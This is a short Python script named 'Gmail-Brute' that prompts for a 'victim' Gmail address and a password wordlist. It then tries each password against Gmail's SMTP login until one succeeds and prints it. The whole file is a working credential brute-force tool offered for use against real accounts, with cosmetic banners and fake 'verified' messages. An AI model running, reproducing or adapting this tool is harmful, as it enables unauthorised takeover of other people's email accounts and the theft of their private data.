import smtplib
import os
import sys
import time

import requests
red = '\033[31m'
yellow = '\033[93m'
green = '\033[92m'
clear = '\033[0m'
bold = '\033[01m'
cyan = '\033[96m'
cy='\033[095m'
#cya='\033[cl
os.system("clear")
os.system("figlet Gmail-Brute")
print(yellow+"\t\tCoded",green,"By U-danbaiwa")
print(green+"\t\t\tv 1.1.2")
print("\n")
gmail=smtplib.SMTP("smtp.gmail.com",587)
gmail.ehlo()
gmail.starttls()
try:
  victim=input("ENTER GMAIL ACCOUNT: ")
  print(yellow+"\nloading...")
  time.sleep(5)
  print(green+"verified!")
  print("")
  password=input("ENTER PASSWORD LIST: ")
  print(cyan+"please wait...")
  time.sleep(5)
  print("\n")
  print("")
  password=open(password,"r")
  for password in password:
    time.sleep(3)
    try:
      gmail.login(victim,password)
      print(green+bold+"PASSWORD FOUND!<====> %s" % password)
      break
    except smtplib.SMTPAuthenticationError:
      print(yellow+bold+"PASSWORD INCORRECT<====> %s" % password)
      os.system("toilet Not Found")
      os.system("figlet Try Again Bro")
      print(cyan+"\t\t\tThank You\n\n")
except Exception:
  print(red+bold+"\t\tSOMETHING WRONG!!!")